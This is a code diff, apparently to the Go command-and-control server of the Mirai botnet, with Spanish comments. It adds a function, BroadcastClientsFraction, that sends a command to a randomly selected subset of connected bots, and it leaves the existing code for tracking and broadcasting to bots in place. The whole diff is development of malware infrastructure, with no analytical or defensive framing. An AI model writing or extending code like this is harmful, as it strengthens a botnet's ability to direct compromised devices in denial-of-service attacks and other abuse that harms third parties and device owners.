@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"log"
+	"math/rand"
 	"net"
 	"sort"
 	"sync"
@@ -66,6 +67,37 @@ func RemoveClient(client *Client) {
 	defer mutex.Unlock()
 	delete(Clients, client.CID)
 	fmt.Printf("Mirai - Left (%s, %s)\r\n", client.Conn.RemoteAddr().String(), client.Source)
+}
+
+// BroadcastClientsFraction envía el comando solo a `max` clientes seleccionados aleatoriamente.
+func BroadcastClientsFraction(p []byte, max int) {
+	if max <= 0 {
+		return
+	}
+	mutex.Lock()
+	// Copiar todos los clientes a un slice
+	all := make([]*Client, 0, len(Clients))
+	for _, c := range Clients {
+		all = append(all, c)
+	}
+	mutex.Unlock()
+
+	if len(all) <= max {
+		// Si hay menos o igual, enviar a todos
+		for _, c := range all {
+			c.Stream <- p
+		}
+		return
+	}
+
+	// Mezclar el slice (Fisher-Yates) para selección aleatoria
+	rand.Shuffle(len(all), func(i, j int) {
+		all[i], all[j] = all[j], all[i]
+	})
+	// Enviar solo a los primeros 'max'
+	for i := 0; i < max; i++ {
+		all[i].Stream <- p
+	}
 }
 
 // BroadcastClients will send the command to all clients.
